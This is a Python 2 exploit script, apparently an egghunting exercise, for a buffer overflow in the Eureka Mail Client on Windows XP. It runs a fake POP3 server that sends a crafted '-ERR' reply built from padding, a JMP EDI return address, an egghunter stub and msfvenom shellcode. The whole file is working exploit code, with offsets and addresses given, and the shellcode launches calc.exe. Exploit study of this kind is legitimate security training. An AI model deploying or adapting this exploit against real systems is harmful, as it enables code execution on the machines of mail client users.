#!/usr/bin/python

# Author: Michael Music
# Date: 3/22/2019
# Description: Eureka Mail Client ERR Buffer Overflow Exploit
#  Exercise in egghunting
#  Tested on Windows XP
# Notes: This is the egghunting version

import socket

ip = '10.10.10.100'

# EIP is at 711 (or 720 - len(ip))
# ESP is at 248
# EDI is at 1008
# JMP ESP is at 0x7e429353
# JMP EDI is at 0x7e41c891

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + "w00t" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

buf = '-ERR '
buf += 'A' * (723 - len(ip))
buf += '\x91\xc8\x41\x7e'
buf += '\x90' * (1008 - len(buf) + 25)
buf += egghunter
buf += '\xCC' * 1000
buf += 'w00tw00t'

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
buf += "\xba\x05\x08\xcf\x11\xdb\xd8\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x31\x31\x56\x13\x83\xee\xfc\x03\x56\x0a\xea"
buf += "\x3a\xed\xfc\x68\xc4\x0e\xfc\x0c\x4c\xeb\xcd\x0c\x2a"
buf += "\x7f\x7d\xbd\x38\x2d\x71\x36\x6c\xc6\x02\x3a\xb9\xe9"
buf += "\xa3\xf1\x9f\xc4\x34\xa9\xdc\x47\xb6\xb0\x30\xa8\x87"
buf += "\x7a\x45\xa9\xc0\x67\xa4\xfb\x99\xec\x1b\xec\xae\xb9"
buf += "\xa7\x87\xfc\x2c\xa0\x74\xb4\x4f\x81\x2a\xcf\x09\x01"
buf += "\xcc\x1c\x22\x08\xd6\x41\x0f\xc2\x6d\xb1\xfb\xd5\xa7"
buf += "\x88\x04\x79\x86\x25\xf7\x83\xce\x81\xe8\xf1\x26\xf2"
buf += "\x95\x01\xfd\x89\x41\x87\xe6\x29\x01\x3f\xc3\xc8\xc6"
buf += "\xa6\x80\xc6\xa3\xad\xcf\xca\x32\x61\x64\xf6\xbf\x84"
buf += "\xab\x7f\xfb\xa2\x6f\x24\x5f\xca\x36\x80\x0e\xf3\x29"
buf += "\x6b\xee\x51\x21\x81\xfb\xeb\x68\xcf\xfa\x7e\x17\xbd"
buf += "\xfd\x80\x18\x91\x95\xb1\x93\x7e\xe1\x4d\x76\x3b\x1d"
buf += "\x04\xdb\x6d\xb6\xc1\x89\x2c\xdb\xf1\x67\x72\xe2\x71"
buf += "\x82\x0a\x11\x69\xe7\x0f\x5d\x2d\x1b\x7d\xce\xd8\x1b"
buf += "\xd2\xef\xc8\x7f\xb5\x63\x90\x51\x50\x04\x33\xae"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip,110))
s.listen(10)

print '[+] Waiting for connection...'

client_socket, client_address = s.accept()

print '[+] Accepted connection'

while True:
    print '[+] Attempting to send payload'
    client_socket.send(buf)

s.close()

print '[+] Connection closed'
